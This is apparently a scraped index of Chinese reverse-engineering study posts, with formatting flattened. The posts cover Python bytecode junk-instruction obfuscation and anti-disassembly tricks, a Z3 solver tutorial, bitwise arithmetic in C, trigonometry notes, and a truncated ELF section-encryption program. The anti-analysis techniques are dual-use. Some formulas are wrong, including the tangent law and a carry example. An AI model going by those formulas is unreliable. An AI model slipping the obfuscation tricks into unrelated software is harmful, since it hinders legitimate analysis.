LOAD_CONST 64 6 (4) 40 CALL_FUNCTION 83 2 42 STORE_NAME 5A 4 (ret) 44 LOAD_CONST 64 7 (None) 46 RETURN_VALUE\t53Disassembly of &lt;code object func1 at 0x00000206F6750500, file &quot;E:\\0xC0de\\Python\\test.py&quot;, line 1&gt;: 2 0 LOAD_FAST 7C 0 (x) 2 LOAD_FAST 7C 1 (y) 4 BINARY_ADD\t17 6 STORE_FAST 7D 2 (sum) 3 8 LOAD_FAST 7C 2 (sum) 10 RETURN_VALUE\t53Disassembly of &lt;code object func2 at 0x00000206F67F0A80, file &quot;E:\\0xC0de\\Python\\test.py&quot;, line 5&gt;: 6 0 LOAD_GLOBAL 74 0 (print) 2 LOAD_CONST 64 1 (&#x27;world&#x27;) 4 CALL_FUNCTION 83 1 6 POP_TOP\t1 7 8 LOAD_CONST 64 0 (None) 10 RETURN_VALUE\t53 main 函数,然后那个30就是main函数的字节码长度,接着还有func1和func2在另外的部分 func1 func2 py保护方法对于愿意进行手动逆向的人来说，唯一可行的手段是增加其逆向的难度和时间成本 1https://github.com/mandiant/flare-bytecode_graph 查阅资料发现 Python 源码有几种保护的方式： 生成 pyc 文件：这感觉完全不能算保护，uncompyle6 一键反编译，支持 Python 1.0 到 3.8 全部版本（恐怖） py 源码混淆：一般针对 py 源码混淆就是往代码里插入一些没有意义跳转分支，修改变量名和函数名等这些操作，但是这种虽然阅读起来很难理解，但是混淆效果并不好。(简称花指令) 打包成可执行的二进制文件,py-&gt;exe-&gt;pyc-&gt;py 自定义 opcode 的 Python 解释器 花指令 :简单的包括跳转混淆、控制流混淆，复杂一些的 除了花指令:可能涉及 byte-code 加密等等 -. pyc考点 给pyc uncompyle6直接反编译 给一个txt 翻译机器码 通过脚本变成结构体和一个文件 再把时间属性和版本的魔术字放回去保存 然后uncompyle6 加花的pyc 1.根据uncompyle6和字节码判断花 2.读取co_code的长度 3.去掉花并修改co_code长度 4.保存uncompyle6即可 听说解包之后的目标.pyc和struct.pyc要做一些修改 也就是把struct.pyc的一些数据放入目标的.pyc 但是,在实践中我发现,struct.pyc和目标的.pyc的二进制文件的前面几个部分,是一样的 源代码混淆他们对类名&#x2F;函数名&#x2F;变量名进行重新命名，pyminifier甚至能够对部分Python常量进行扰乱（如True&#x2F;False&#x2F;None)，然而代码的逻辑与控制流并没有被改变 魔改pyc指令1234567891011121314151617181920212223242526# c = 1145140 LOAD_CONST 1 (1)\t# push 1145142 STORE_FAST 3 (3) # c = 114514# print(a, b)4 LOAD_GLOBAL 0 (0) # push global_obj co_names[0] == &quot;print&quot;6 LOAD_FAST 0 (0) # push a8 LOAD_FAST 1 (1) # push b --&gt; 这个在最顶端10 CALL_FUNCTION 2 # 其中最右边的参数在最顶端，即从左往右push；区别于C式栈，从右往左push12 POP_TOP # 不要返回值，直接弹掉# ============================魔改部分==========================================# print(a, b)4 LOAD_GLOBAL 0 (0) # push global_obj co_names[0] == &quot;print&quot;6 LOAD_FAST 0 (0) # push a8 LOAD_FAST 1 (1) # push b --&gt; 这个在最顶端10 CALL_FUNCTION 2 # 其中最右边的参数在最顶端，即从左往右push；区别于C式栈，从右往左push12 POP_TOP # 不要返回值，直接弹掉# =============================================================================# print(args)14 LOAD_GLOBAL 0 (0) # push global_obj co_names[0] == &quot;print&quot;16 LOAD_FAST 2 (2) # push args18 CALL_FUNCTION 120 POP_TOP# return None22 LOAD_CONST 0 (0) # push None24 RETURN_VALUE 垃圾代码基于溢出如果有垃圾数据arr[0xFF] 反汇编器去根据索引乖乖的找数据，结果就会溢出而报错。 python原生反汇编器会炸，因为它不检查越界问题 pycdas不会炸，而是会直接显示&lt;INVALID&gt;，说明已经考虑到越界问题了。 pycdas&#x2F;uncompyle6会炸。经典的tuple out of range 虚假分支开发者可以故意构造复杂的分支结构，然而通过预置条件来实现仅覆盖特定分支，可以有效的浪费手动逆向者的时间与精力， 即便逆向者使用控制流分析软件也无济于事。 12345678#flag可以是一些计算的结果#或者是隐藏在某处的预置常量#也可以是某次函数调用的返回值if 满足条件的情况下: 正常代码else 无用的但复杂的代码,甚至是不合法的代码 123456try: 一些正常代码 产生异常,于是开启流程跳转 无用的但复杂的代码,甚至是不合法的代码except: 继续正常的代码 比如一些异常 12345raise_exeception = __import__(&#x27;module_does_not_exist&#x27;) 抛出一个&#x27;ImportError&#x27;的意外raise_exeception = __import__(&#x27;sys&#x27;).non_exist_function() 抛出一个&#x27;AttributeError&#x27;的意外raise_exeception = 1/0 抛出一个&#x27;ZeroDivisionError&#x27;的意外，控制流将转向except分支 花指令题目 1https://qiumingshanshangdexiaoning.gitee.io/2021/11/28/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%9B%9B%E7%A7%8Dpython%E9%80%86%E5%90%91/#%E5%8A%A0%E8%8A%B1%E6%8C%87%E4%BB%A4%E7%9A%84pyc 如何寻找花指令? 去dis反编译,然后他会遇到花指令然后报错 uncompyle 的工作原理和一般的反编译器类似，它会尽力去匹配每一条指令，匹配失败就g 强制跳转123https://blog.csdn.net/ChiWu98/article/details/118674302https://cloud.tencent.com/developer/article/1421880https://juejin.cn/post/7143110497951285256 花指令主要分为两种 可执行花指令a. 可以运行，但无意义b. 不改变寄存器的数值c. 可以被反汇编器识别 但是会破坏反汇编器的分析 不可执行花指令a. 无法运行b. 直接扰乱反汇编器的线性扫描 阻止反汇编 12345JUMP_ABSOULUTE xxxLOAD_CONST 255常用的JUMP_ABSOLUTE和Load_Const71 04 64 FF 举个简单的例子64 00 12340 LOAD_NAME 0 (print)2 LOAD_CONST 0 (&#x27;Hello, world&#x27;)4 CALL_FUNCTION 16 POP_TOP 这是我们上面 Python 3.7生成的 pyc 的一段 opcode 序列，考虑在它的前面加两条指令。 1234560 JUMP_ABSOLUTE 42 LOAD_CONST 2554 LOAD_NAME 0 (print)6 LOAD_CONST 0 (&#x27;Hello, world&#x27;)8 CALL_FUNCTION 110 POP_TOP 其中 JUMP_ABSOLUTE 4 表示直接跳转到 offset 为4的位置去执行指令 也就是插入的第二条指令 LOAD_CONST 255 并不会被执行，所以所以也并不会报错。 但是对于反编译工具来说，这就是一个错误了，直接导致了反编译的失败。 Python 的 opcode 中 JUMP 相关的有 123456&#x27;JUMP_FORWARD&#x27;,&#x27;JUMP_IF_FALSE_OR_POP&#x27;,&#x27;JUMP_IF_TRUE_OR_POP&#x27;,&#x27;JUMP_ABSOLUTE&#x27;,&#x27;POP_JUMP_IF_FALSE&#x27;,&#x27;POP_JUMP_IF_TRUE&#x27;, 原则上这六个都可以使用，但是实际上为了方便的话，其实还是 JUMP_FORWARD 和 JUMP_ABSOLUTE 比较好用 (字面理解，一个是相对跳转，一个是绝对跳转) 因为其他的 JUMP 指令存在一些当前栈顶元素判断的问题（要做也可以，只不过实现同样的功能可能需要写更多的指令） 偶数跳转|奇数跳转1271 0387 NO 导言 一般的反汇编器由于是线性扫描的，2字节2字节的，所以我们这样正好凑偶数地址偶数跳转，就能够正常反汇编。 垃圾数据没识别出来的，直接显示成&lt;invalid&gt;，不会导致完全失败 因为Python3解释器是默认偶数地址执行，所以实际上地址会向前取偶，即从如果地址是13,那么实际会14开始执行。 这样实现，还是能保证14-2-2&#x3D;10个字节可以用于垃圾数据，但是后续的指令仍然能够很正常完美的被反汇编器打印出来 下面是一个py2的例子 123456789# 例1 Python单重叠指令0 JUMP_ABSOLUTE [71 07 00] 73 PRINT_ITEM [47 xx xx]6 LOAD_CONST [64 64 01]9 STOP_CODE [00 xx xx]# 例1 实际执行0 JUMP_ABSOLUTE [71 07 00] 77 LOAD_CONST [64 01 00] 1 上面的JUMP_ABSOLUTE跳到了一个未知的地方 显示的汇编指令是没去花的,它逐字逐句的翻译,其实执行不是 因为他们之间有很多的垃圾代码 下面是x86的eg,结合python字节码的举例 1234567例1单重叠指令00: EB 01 jmp 302: 68 c3 90 90 90 push 0x909090c3#例1实际执行00: EB 01 jmp 303: C3 retn 123456789例2多重叠指令00: EB02 jmp 402: 69846A40682C104000EB02 imul eax, [edx + ebp*2 + 0102C6840], 0x002EB0040#例2实际执行00: EB02 jmp 404: 6A40 push 04006: 682C104000 push 0x40102C0B: EB02 jmp 0xF 12345678#例3跳转至自身00: EBFF jmp 102: C0C300 rol bl, 0#例3实际执行00: EBFF jmp 101: FFC0 inc eax03: C3 retn 解决办法修改dis模块也就是源代码反编译出错,那么你就修改反编译的函数 比如下面 123456789print opname[op].ljust(20),i = i+1if op &gt;= HAVE_ARGUMENT: oparg = ord(code[i]) + ord(code[i+1])*256 + extended_arg extended_arg = 0 i = i+2 if op == EXTENDED_ARG: extended_arg = oparg*65536L print repr(oparg).rjust(5), 修改后 123456789101112print opname[op].ljust(20),i = i+1if op &gt;= HAVE_ARGUMENT: try: oparg = ord(code[i]) + ord(code[i+1])*256 + extended_arg except: pass extended_arg = 0 i = i+2 if op == EXTENDED_ARG: extended_arg = oparg*65536L print repr(oparg).rjust(5), nop1Hex 0x09 Dec:009 Name: NOP 修改CPython启用debug…我不多说,因为不会 扁平化1https://www.anquanke.com/post/id/185482 查看main函数流程图,我不知道如何遍历所有的pycodeobject 12345678910import bytecode_graph from dis import opmapimport sysimport marshalpyc_file = open(&quot;test.pyc&quot;, &quot;rb&quot;).read()pyc = marshal.loads(pyc_file[8:])bcg = bytecode_graph.BytecodeGraph(pyc)graph = bytecode_graph.Render(bcg, pyc).dot()graph.write_png(&#x27;example_graph.png&#x27;) 如果有源码,比如查看源码中的函数My_base64_encode 12345import bytecode_graph#...bcg = bytecode_graph.BytecodeGraph(My_base64_encode.__code__)graph = bytecode_graph.Render(bcg, My_base64_encode.__code__).dot()graph.write_png(&#x27;example_graph.png&#x27;)","tags":["Pytohn","PYC"],"categories":["Reverse"]},{"title":"数学公式","path":"/re4mile/2021/06/07/re/加密算法/数学公式/re/","content":"待学习的参考链接傅里叶加密 https://joi.usst.edu.cn/html/2015/1/20150116.htm#outline_anchor_5 https://zhuanlan.zhihu.com/p/104079068 https://baike.baidu.com/item/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/7119029 https://www.cnblogs.com/h2zZhou/p/8405717.html 在线网站MD5 https://www.cmd5.com/ 斐波那契数列1234567891011121314151617181920#include&lt;stdio.h&gt;int main()&#123;\tint q1=0;\tint q2=1;\tint sum=0; int i=0;\tint max=0;\tputs(&quot;请问你要输出几个数?&quot;);\tscanf(&quot;%d&quot;,&amp;max);\tfor(;i&lt;max;i++)\t&#123; printf(&quot;%d &quot;,q1); sum=q1+q2; q1=q2; q2=sum; &#125; &#125; 三角函数参考链接 https://baike.baidu.com/item/%E4%B8%89%E8%A7%92%E5%87%BD%E6%95%B0/1652457#7 我想说的是,三角函数的东西很多 相关公式sinx+cosx&#x3D;√2sin(x+1&#x2F;4π) 解：sinx+cosx&#x3D;√2√2&#x2F;2sinx+√2√2&#x2F;2cosx &#x3D;√2*cos(π&#x2F;4)sinx+√2sin(π&#x2F;4)*cosx &#x3D;√2*(cos(π&#x2F;4)*sinx+sin(π&#x2F;4)*cosx) &#x3D;√2*sin(x+π&#x2F;4) 二角和差公式 和差化积 积化和差 二倍角公式 sinx十cosx万能公式： sinα&#x3D;【2tan（α&#x2F;2）】&#x2F;｛1+【tan（α&#x2F;2）】²｝ cosα&#x3D;【1-tan（α&#x2F;2）²】&#x2F;｛1+[tan（α&#x2F;2）】²｝ tanα&#x3D;【2tan（α&#x2F;2）】&#x2F;｛1-【tan（α&#x2F;2）】²｝ 基本函数 缩写 表达式 正弦函数 sin a&#x2F;c 余弦函数 cos b&#x2F;c 正切函数 tan a&#x2F;b 余切函数 cot b&#x2F;a 正割函数 sec c&#x2F;b 余割函数 csc c&#x2F;a 相关定理三角恒等式对于任意非直角三角形中,如三角形ABC,总有tanA+tanB+tanC&#x3D;tanAtanBtanC 射影定理 射影定理 ①CD²&#x3D;AD·BD ②AC²&#x3D;AD·AB ③BC²&#x3D;BD·AB ④AC·BC&#x3D;AB·CD a&#x3D;bcosC+ccosB b&#x3D;ccosA+acosC c&#x3D;acosB+bcosA 广义射影定理三角形中任意一边等于其他两边以及对应角余弦的交叉乘积的和，即a &#x3D; c·cosB + b·cosC 正切定理对于边长为a,b和c而相应角为A,B和C的三角形，有： $$\\frac{a+b}{a-b}$$&#x3D;$$\\frac{\\tan\\frac{a+b}{2}}{\\tan\\frac{a+b}{2}}$$ 正弦定理$$\\frac{a}{sinA}$$&#x3D;$$\\frac{b}{sinB}$$&#x3D;$$\\frac{c}{sinC}$$&#x3D;2R 余弦定理对于边长为a、b、c而相应角为A、B、C的三角形，有： a² &#x3D; b² + c²- 2bc·cosA b² &#x3D; a² + c² - 2ac·cosB c² &#x3D; a² + b² - 2ab·cosC 也可表示为： cosC&#x3D;$$\\frac{a²+b²-c²}{2ab}$$ cosB&#x3D;$$\\frac{a² +c² -b²}{2ac}$$ cosA&#x3D;$$\\frac{c² +b² -a²}{2bc}$$ 余弦定理用于在一个三角形的两个边和一个角已知时确定未知的数据 泰勒无穷级数ez&#x3D;exp（z）&#x3D;1+z&#x2F;1！+z2&#x2F;2！+z3&#x2F;3！+z4&#x2F;4！+…+zn&#x2F;n!","tags":["逆向加密算法"],"categories":["Reverse"]},{"title":"Python Z3","path":"/re4mile/2021/06/07/re/Z3/基础/re/","content":"参考链接https://ericpony.github.io/z3py-tutorial/guide-examples.htm https://developer.aliyun.com/article/815127#slide-1 https://z3prover.github.io/api/html/namespacez3py.html 环境配置运行环境 vscode ,Python3.89 安装模块 1pip install z3_solver 变量整数变量👋12x = Int ( &#x27;x&#x27; ) y = Int ( &#x27;y&#x27; ) 基于bit位的整数👋BitVec(&#39;x&#39;, 16)在 Z3 中创建一个名为x的16位位向量变量。 BitVecVal(10, 32)创建一个大小为32的位向量，其中包含值10 1x, y = BitVecs(&#x27;x y&#x27;, 32) 注意数值的范围,正负,默认是无符号.如果你写入有符号的,会被自动转化为无符号的 1234567891011121314151617181920212223from z3 import *import osos.system(&#x27;cls&#x27;)print(&quot;*********************************************&quot;)# 默认是无符号的,所以你在进行有符号运算时,都会被转化为无符号的x = BitVec(&#x27;x&#x27;, 16)y = BitVec(&#x27;y&#x27;, 16)print(simplify(x + y - 1))a = BitVecVal(-1, 16)b = BitVecVal(65535, 16)print(simplify(a == b)) # Truea = BitVecVal(-1, 32)b = BitVecVal(65535, 32)print(simplify(a == b)) # Falseprint(&quot;*********************************************&quot;) 与 C、C++、C#、Java 等编程语言相比，有符号和无符号位向量作为数字没有区别。 相反，Z3 提供了特殊的带符号版本的算术运算， 其中位向量被视为带符号还是无符号都会有所不同。 在 Z3Py 中，运算符 &lt;、 &lt;=、 &gt;、 &gt;=、/、%和&gt;&gt;对应于有符号版本。 相应的无符号运算符是 ULT、 ULE、 UGT、 UGE、UDiv、URem和LShR 现在有个问题.什么时候,有符号和无符号会存在差异????? 1234567891011121314151617from z3 import *import osos.system(&#x27;cls&#x27;)print(&quot;*********************&quot;)x, y = BitVecs(&#x27;x y&#x27;, 32)solve(x + y == 2, x &gt; 0, y &gt; 0)solve(x &amp; y == ~y)solve(x &lt; 0)solve(ULT(x, 0))x, y = BitVecs(&#x27;x y&#x27;, 32)solve(x &gt;&gt; 2 == 3)solve(x &lt;&lt; 2 == 3)solve(x &lt;&lt; 2 == 24)print(&quot;**********************&quot;) 数组👋12X = [ Int(&#x27;x%s&#x27; % i) for i in range(5) ] # 表达式&quot;x%s&quot; % i返回一个字符串，其中%s被替换为i的值。Y = [ Int(&#x27;y%s&#x27; % i) for i in range(5) ] 12345678910111213141516171819202122232425262728293031from z3 import *import osos.system(&#x27;cls&#x27;)print(&quot;*********************&quot;)# Create list [1, ..., 5] print([ x + 1 for x in range(5) ])X = [ Int(&#x27;x%s&#x27; % i) for i in range(5) ] # 表达式&quot;x%s&quot; % i返回一个字符串，其中%s被替换为i的值。Y = [ Int(&#x27;y%s&#x27; % i) for i in range(5) ]print(X)# Create a list containing X[i]+Y[i]X_plus_Y = [ X[i] + Y[i] for i in range(5) ]print(X_plus_Y)# Create a list containing X[i] &gt; Y[i]X_gt_Y = [ X[i] &gt; Y[i] for i in range(5) ]print(X_gt_Y)print(And(X_gt_Y))# 创建了一个二维的数组X = [ [ Int(&quot;x_%s_%s&quot; % (i+1, j+1)) for j in range(3) ] for i in range(3) ]pp(X) # 命令pp类似于printprint(&quot;**********************&quot;) 一种新的方式创建数组 123456789101112131415161718from z3 import *import osos.system(&#x27;cls&#x27;)print(&quot;*********************&quot;)X = IntVector(&#x27;x&#x27;, 5)Y = RealVector(&#x27;y&#x27;, 5)P = BoolVector(&#x27;p&#x27;, 5)print(X)print(Y)print(P)print([ y**2 for y in Y ])print(Sum([ y**2 for y in Y ]))print(&quot;**********************&quot;) 有理数实数包含了有理数和无理数 1x, y, z = Reals(&#x27;x y z&#x27;) 写代码的时候用的不多,理解一下就行 1234567891011from z3 import *print (1/3)print (RealVal(1)/3)print (Q(1,3))x = Real(&#x27;x&#x27;)print (x + 1/3)print (x + Q(1,3))print (x + &quot;1/3&quot;)print (x + 0.25) 上面是一个有理数的例子,写代码的时候用的不多,理解一下就行 布尔变量我表示没看懂,写代码的时候用的不多,理解一下就行 123456from z3 import *p = Bool(&#x27;p&#x27;)q = Bool(&#x27;q&#x27;)r = Bool(&#x27;r&#x27;)solve(Implies(p, q), r == Not(q), Or(Not(p), r)) 解方程直接型也就是把条件直接放入方程里面求解,函数自动返回结果 solve里面添加条件是可以直接求解的 12345678910111213141516from z3 import *import osos.system(&#x27;cls&#x27;)print(&quot;**********************&quot;)a, b, c = Ints(&#x27;a b c&#x27;)d, e = Reals(&#x27;d e&#x27;)solve( a &gt; b + 2, a == 2*c + 10, c + b &lt;= 1000, d &gt;= e)print(&quot;***********************&quot;) 条件逐个增加慢慢的add,只增加条件,不减少条件 123456789101112131415161718from z3 import *import osos.system(&#x27;cls&#x27;)print(&quot;***********************&quot;) f = Solver()x, y, z = BitVecs(&#x27;x y z&#x27;, 8)f.add(x ^ y &amp; z == 12)f.add(y &amp; z &gt;&gt; 3 == 3)f.add(z ^ y == 4)if f.check()==sat: model = f.model() print(model)print(&quot;***********************&quot;) 慢慢的push条件,可以pop减少条件 123456789101112131415161718192021222324252627282930from z3 import *import osos.system(&#x27;cls&#x27;)print(&quot;***********************&quot;) x = Int(&#x27;x&#x27;)y = Int(&#x27;y&#x27;)f = Solver()print (f) # 方程啥也没添加,所以为空f.add(x &gt; 10, y == x + 2) # 这2个条件已经写死了,不能删除,虽然可以增加print (f) # 添加了约束条件,所以就不再为空了print (f.check()) # 有解的情况,返回sat 无解返回unsat# 增加一个可以自由删除的条件f.push()f.add(y &lt; 11)print (f)print (f.check())# 删除我们刚才push进去的条件f.pop()print (f)print (f.check())print(&quot;***********************&quot;) 获取所有的解集12345678910while(f.check()==sat): condition = [] m = f.model() p=&quot;&quot; for i in range(len): p+=chr(int(&quot;%s&quot; % (m[flag[i]]))) condition.append(flag[i]!=int(&quot;%s&quot; % (m[flag[i]]))) print(p) f.add(Or(condition)) 应用实例整数12345678910111213141516171819from z3 import *import osos.system(&#x27;cls&#x27;)print(&quot;***********************&quot;) f = Solver() # 创建一个方程a, s, d = Ints(&#x27;a s d&#x27;) # 创建方程变量f.add(a-d == 18) # 添加方程的约束条件f.add(a+s == 12)f.add(s-d == 20)if f.check() ==sat: # 返回方程的解集情况,有就返回sat,没有就返回 result = f.model() # 解集放在了model()里面 print(result)else: print(&quot;unsat&quot;)print(&quot;***********************&quot;) 有理数有理数(正数,负数,小数,整数) 123456789101112131415161718192021from z3 import *import osos.system(&#x27;cls&#x27;)print(&quot;***********************&quot;) f = Solver()x = Real(&#x27;x&#x27;)y = Real(&#x27;y&#x27;)f.add(x**2 + y**2 == 3)f.add(x**3 == 2)if f.check() ==sat: # 返回方程的解集情况,有就返回sat,没有就返回 result = f.model() # 解集放在了model()里面 print(result)else: print(&quot;unsat&quot;)print(&quot;***********************&quot;) 基于bit位的整数123456789101112131415161718from z3 import *import osos.system(&#x27;cls&#x27;)print(&quot;***********************&quot;) f = Solver()x, y, z = BitVecs(&#x27;x y z&#x27;, 8)f.add(x ^ y &amp; z == 12)f.add(y &amp; z &gt;&gt; 3 == 3)f.add(z ^ y == 4)if f.check()==sat: model = f.model() print(model)print(&quot;***********************&quot;) 遍历解集12345678910111213141516171819202122232425262728from z3 import *import osos.system(&#x27;cls&#x27;)print(&quot;*********************************************&quot;)x, y, z = Reals(&#x27;x y z&#x27;)&#x27;&#x27;&#x27;x = Real(&#x27;x&#x27;)y = Real(&#x27;y&#x27;)z = Real(&#x27;z&#x27;)&#x27;&#x27;&#x27;f = Solver()f.add(x &gt; 1, y &gt; 1, x + y &gt; 3, z - x &lt; 10)print(f.check())# 解集放在了f.model()里面result = f.model()print(&quot;x = %s&quot; % result[x]) # 我们本来就知道其中一个解的名字是xprint(&quot;---------------------------------------------&quot;)for member in result.decls(): # 取出每一个成员,然后输出,成员的属性有名字 print(&quot;%s = %s&quot; % ( member.name(), result[member]))print(&quot;*********************************************&quot;) 附录其它写的比较的部分,但是没有太多的时间在上面花费 https://developer.aliyun.com/article/815127#slide-1","tags":["Z3"],"categories":["Reverse"]},{"title":"底层原理","path":"/re4mile/2021/06/07/re/底层原理/四则运算/re/","content":"用位运算实现最基本的四则运算参考链接,谢谢原作者 https://blog.csdn.net/SunXiWang/article/details/78509096 https://blog.csdn.net/kafmws/article/details/88983865 32位加法不需要进位的二进制加法运算可以通过异或运算来实现 为什么? 从二进制位的角度来说 因为1+0&#x3D;1, 1+1&#x3D;0, 0+0&#x3D;0 因为1^0&#x3D;1, 1^1&#x3D;0, 0^0&#x3D;0 可以看出结果是一样的 可是我们的运算是存在进位的 我们以数值142+294为例子 分2个步骤考虑 二进制怎么获取进位值呢？ps:我们指的是bit位的进位 进位值可以通过两个数相与，如果相与之后的值为零，说明没有进位。， 如果相与之后的值不为0，则说明有进位，将其左移一位 即可得到其进位值 比如1&amp;1&#x3D;0,有进位,1&amp;0&#x3D;0,无进位 比如上面的例子,进位值1在个位,最后是放在了百分位和336运算 为什么用&amp;来判断进位,因为其它方法不行,废话💞 那么具体怎么算? 就是用非进位的值和进位的值相加(确切的说是相异或),也就是不断的异或,知道有没有进位,说明一次性就可以运算成功 就像336+100,不存在进位,就算完了 12345678910111213141516171819202122//非递归版本int add_A(int a, int b) &#123;\tint sum = 0;\tint flag_CF = 0;\tdo &#123; sum = a ^ b; flag_CF = (a &amp; b) &lt;&lt; 1; a = sum; b = flag_CF;\t&#125; while (flag_CF);\treturn sum;&#125;//递归版本int add_B(int sum, int carry) &#123;\tif (carry == 0) return sum;\treturn add_B(sum ^ carry, (sum &amp; carry) &lt;&lt; 1);&#125; 简化版本 1234int Add(int a,int b)&#123;\treturn b ? Add(a^b,(a&amp;b)&lt;&lt;1) : a;&#125; 32位减法&#x2F;&#x2F;数据取反前后,数值相加的话,结果是0xFF&#x3D;-1….,&#x2F;&#x2F;比如A取反的结果是B,那么A+B&#x3D;0xFF&#x3D;-1,同时0xFF+1&#x3D;-1+1&#x3D;0,&#x2F;&#x2F;所以A+B+1&#x3D;0,所以A的相反数就是B+1&#x3D;~A+1 减法也是加法 123456789101112131415161718192021222324252627#include&lt;stdio.h&gt;int add_A(int a, int b) &#123;\tint sum = 0;\tint flag_CF = 0;\tdo &#123; sum = a ^ b; flag_CF = (a &amp; b) &lt;&lt; 1; a = sum; b = flag_CF;\t&#125; while (flag_CF);\treturn sum;&#125;int sub_A(int num, int dead) //减法也是加法&#123;\treturn add_A(num, add_A(~dead, 1));&#125;int main()&#123;\t//数据取反前后,数值相加的话,结果是0xFF....,\t//比如A取反的结果是B,那么A+B=0xFF,同时0xFF+1=0,\t//所以A+B+1=0,所以A的相反数B+1=~A+1\tprintf(&quot;%d&quot;,sub_A(120,30));\treturn 0;&#125; 32位乘法用加法实现乘法 最基本的原理实现如下,下面有个优化版,我觉得值得我们好好学习一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include&lt;stdio.h&gt;int add_A(int sum, int carry);int abs_A(int num);int mul_A(int a, int b);int main()&#123;\tint x = 2;\tint y = 15;\tint result = 0;\tresult = mul_A(x, y);\tprintf(&quot;%d/n&quot;, result);\treturn 0;&#125;int add_A(int sum, int carry)&#123;\tif (carry == 0) return sum;\treturn add_A(sum ^ carry, (sum &amp; carry) &lt;&lt; 1);&#125;int sub_A(int num, int dead) //减法也是加法&#123;\treturn add_A(num, add_A(~dead, 1));&#125;int abs_A(int num)&#123;\treturn num &lt; 0 ? add_A((~num), 1) : num;&#125;int mul_A(int a, int b)&#123;\tif (a == 0 || b == 0) return 0;\tint flag_a = (a &gt;&gt; 31) &amp; 1;\tint flag_b = (b &gt;&gt; 31) &amp; 1;//取符号位\ta = abs_A(a);\tb = abs_A(b);//计算绝对值\tint min = a &gt; b ? b : a;\tint max = a &gt; b ? a : b;\tint res = 0;\twhile (min)\t&#123; min = sub_A(min, 1); res = add_A(res, max);\t&#125;//用加法实现乘法\tif (flag_a != flag_b)\t&#123; res = add_A((~res), 1);\t&#125;//判断符号\treturn res;&#125; 优化版本,值得学习 优化版本的接受 导入: 所以,优化后,我们最多执行31次加法,无论乘法多么复杂 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include&lt;stdio.h&gt;int add_A(int sum, int carry);int abs_A(int num);int mul_A(int a, int b);int main()&#123;\tint x = 125;\tint y = 5;\tint result = 0;\tresult = mul_A(x, y);\tprintf(&quot;%d/n&quot;, result);\treturn 0;&#125;int add_A(int sum, int carry)&#123;\tif (carry == 0) return sum;\treturn add_A(sum ^ carry, (sum &amp; carry) &lt;&lt; 1);&#125;int abs_A(int num)&#123;\treturn num &lt; 0 ? add_A((~num), 1) : num;&#125;int mul_A(int a, int b)&#123;\tint flag = (a ^ b) &lt; 0;\tint res = 0;\tint cnt = 0;//位数 if (a == 0 || b == 0) return 0;\ta = abs_A(a);\tb = abs_A(b);\twhile (b)\t&#123; if (b &amp; 1) res= add_A(res, a); a = (a &lt;&lt; 1); b = (b &gt;&gt; 1);\t&#125;\tif (flag)\t&#123; res = add_A((~res), 1);\t&#125;\treturn res;&#125; 32位除法同样的思路，用减法实现除法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include&lt;stdio.h&gt;int add_A(int sum, int carry);int abs_A(int num);int div_A(int num, int dev);int main()&#123;\tint result = 0;\tresult = div_A(104, 4);\tprintf(&quot;%d/n&quot;, result);\treturn 0;&#125;int add_A(int sum, int carry)&#123;\tif (carry == 0) return sum;\treturn add_A(sum ^ carry, (sum &amp; carry) &lt;&lt; 1);&#125;int sub_A(int num, int dead) //减法也是加法&#123;\treturn add_A(num, add_A(~dead, 1));&#125;int abs_A(int num)&#123;\treturn num &lt; 0 ? add_A((~num), 1) : num;&#125;int div_A(int num, int dev)&#123;\t//减法,乘法,除法都是基于加法的\tint cnt = 0;\tint i = 0;\tint flag = (num ^ dev) &lt; 0;\tnum = abs_A(num);\tdev = abs_A(dev);\tfor (i = 31; i &gt;= 0; i=sub_A(i,1))\t&#123; //比较x是否大于y的(1&lt;&lt;i)次方，避免将x与(y&lt;&lt;i)比较，因为不确定y的(1&lt;&lt;i)次方是否溢出 if ((num &gt;&gt; i) &gt;= dev) &#123; cnt = add_A(cnt,1 &lt;&lt; i); num = sub_A(num, dev &lt;&lt; i); &#125;\t&#125;\tif (flag)\t&#123; cnt = add_A((~cnt), 1);\t&#125;\treturn cnt;&#125;","tags":["AntiDbg"],"categories":["Reverse"]},{"title":"ELF反调试","path":"/re4mile/2021/06/07/re/反调试/ELF/re/","content":"参考链接https://www.cnblogs.com/h2zZhou/p/6637890.html 带学习的参考链接 https://blog.csdn.net/stonesharp/article/details/8211526 数据加密 有源码加固 基于特定section的加解密实现 基于section的加解密，是指将elf文件的特定section进行加密，elf文件被加载时解密 代码加密.可以对指定函数进行代码片加密，只有程序运行的时候才能解密，破解者无法 Dump 出整体的内存， 有效防止逆向工程工具对程序进行静态分析 下面是对一个节区的加密代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152#define BYTE unsigned char#define DWORD unsigned int#define QWORD unsigned long long#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;elf.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char* qword_to_str(QWORD data, BYTE* buf);BYTE* gbuf[64];int main(int argc, char** argv)&#123;\tchar target_section [] = &quot;.text&quot;;\tchar *lp_SecName = 0;\tchar *Sec_Data = 0;\tElf64_Ehdr st_Elf_Header64;\tElf64_Shdr st_SecHeader64;\tQWORD\ti=0;\tQWORD\tSec_FA=0, Sec_Size=0;\tQWORD\tnblock=0, nsize=0, block_size = 16; int fd;\tint NumSec = 0; if (argc &lt; 2)\t&#123; puts(&quot;Input xxx.elf file&quot;); return -1;\t&#125; fd = open(argv[1], O_RDWR);\tif (fd &lt; 0)\t&#123; printf(&quot;open %s failed &quot;, argv[1]); goto _error;\t&#125;\t//读取elf文件头\tif(read(fd, &amp;st_Elf_Header64, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr))\t&#123; puts(&quot;Read ELF header error&quot;); goto _error;\t&#125; //off_t lseek(文件描述符,偏移,起点);\t//找到节区名的section\tlseek(fd, st_Elf_Header64.e_shoff + sizeof(Elf64_Shdr) * st_Elf_Header64.e_shstrndx, SEEK_SET); // ELF section string table\tif(read(fd, &amp;st_SecHeader64, sizeof(Elf64_Shdr)) != sizeof(Elf64_Shdr))\t&#123; puts(&quot;Read ELF section string table 